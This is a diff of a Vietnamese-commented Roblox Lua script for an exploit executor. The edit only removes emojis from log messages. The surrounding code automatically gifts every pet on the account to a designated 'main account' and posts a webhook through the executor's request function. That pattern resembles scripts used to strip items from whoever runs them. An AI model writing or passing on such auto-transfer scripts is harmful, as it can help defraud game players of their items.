@@ -1,4 +1,4 @@
-print("✅ Script đang khởi động...")
+print("Script đang khởi động...")
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -55,9 +55,9 @@ end
 local function printCurrentPets()
     local pets = getValidPetTools()
     if #pets == 0 then
-        print("📦 Không có pet.")
+        print(" Không có pet.")
     else
-        print("📦 Danh sách pet hiện có:")
+        print("Danh sách pet hiện có:")
         for _, pet in ipairs(pets) do
             print("- " .. pet.tool.Name)
         end
@@ -86,7 +86,7 @@ end
 local function autoGiftAllPets(mainPlayer)
     local pets = getValidPetTools()
     if #pets == 0 then
-        warn("❌ Không có pet để gift.")
+        warn("Không có pet để gift.")
         return
     end
 
@@ -138,9 +138,9 @@ local function sendWebhook()
     elseif request then request(req); success = true end
 
     if success then
-        print("✅ Webhook đã gửi.")
+        print("Webhook đã gửi.")
     else
-        warn("⚠️ Webhook thất bại (executor không hỗ trợ bla bla bla).")
+        warn("Webhook thất bại (executor không hỗ trợ bla bla bla).")
     end
 end
 
@@ -154,7 +154,7 @@ task.spawn(function()
         if main then
             autoGiftAllPets(main)
         else
-            print("⏳ Chưa thấy acc chính trong server.")
+            print("Chưa thấy acc chính trong server.")
         end
 
         Players.PlayerAdded:Connect(function(p)
@@ -164,6 +164,6 @@ task.spawn(function()
             end
         end)
     else
-        print("⛔ Đây là account chính, không tự động gift.")
+        print("Đây là account chính")
     end
 end)
